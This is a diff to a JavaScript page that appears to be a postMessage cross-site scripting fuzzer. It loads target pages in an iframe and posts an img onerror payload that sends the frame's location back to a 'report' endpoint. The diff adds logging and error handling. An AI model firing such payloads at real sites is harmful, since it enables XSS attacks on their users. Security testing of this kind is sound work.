@@ -19,7 +19,7 @@
   var target = '';
   var locations = [];
   var index = 0;
-  var payload = "z=new window.XMLHttpRequest();console.log(z);z.open('post','"+location.href+"report',true);z.setRequestHeader('Content-type','application/x-www-form-urlencoded');z.send('location='+escape(location));"
+  var payload = "console.log(location.href);z=new window.XMLHttpRequest();console.log(z);z.open('post','"+location.href+"report',true);z.setRequestHeader('Content-type','application/x-www-form-urlencoded');z.send('location='+escape(location));"
   
   $(document).ready(function() {
     $('#fuzz-form').hide();
@@ -46,9 +46,13 @@
 
   $('iframe#target').load(function() {
     var frame = window.frames[0];
-    if (typeof(frame) !== "undefined" && frame.location.href !== "about:blank") {
-      frame.postMessage('<img src="a" onerror="'+payload+'">', target);
-      setTimeout('loadFrame(locations[index++])', 2000);
+    try {
+      if (typeof(frame) !== "undefined") {
+        frame.postMessage('<img src="a" onerror="'+payload+'">', target);
+        setTimeout('loadFrame(locations[index++])', 2000);
+      }
+    } catch(e) {
+      console.log(e);
     }
   });
 
